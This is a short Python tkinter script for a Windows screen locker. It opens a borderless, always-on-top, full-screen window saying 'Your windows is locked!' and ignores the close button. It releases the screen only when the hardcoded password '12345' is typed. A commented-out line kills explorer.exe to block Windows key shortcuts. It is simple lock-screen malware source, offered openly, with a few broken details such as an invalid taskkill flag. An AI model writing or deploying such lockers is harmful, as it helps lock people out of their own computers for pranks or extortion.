from tkinter import *
from subprocess import Popen as cmd
import sys

NameFile = sys.argv[0]

root = Tk()


def CheckPassword(arg):
    if password.get() == "12345":
        root.destroy()
        cmd("start explorer.exe", shell=True)
        # universal coice!
        try:
            quit()

        except:
            cmd(f"taskkill /f /in {NameFile}", shell=True)
        #                                     #


X = root.winfo_screenwidth()
Y = root.winfo_screenheight()

# cmd("taskkill /f /in explorer.exe", shell=True) # Uncomment if you want to deny access to combinations "Win+*"


bg = "black"
root["bg"] = bg
font = "Arial 25 bold"
root.protocol("WM_DELETE_WINDOW", lambda arg: ...)  # Same as Quit only simplified
root.attributes("-topmost", 1)
root.geometry(f"{X}x{Y}")
root.overrideredirect(1)
Label(text="Your windows is locked!", fg="red", bg=bg, font=font).pack()
Label(text="\n\n\n\ntype the pussword", fg="white", bg=bg, font=font).pack()

password = Entry(font=font)
password.pack()
password.bind("<Return>", CheckPassword)
root.mainloop()
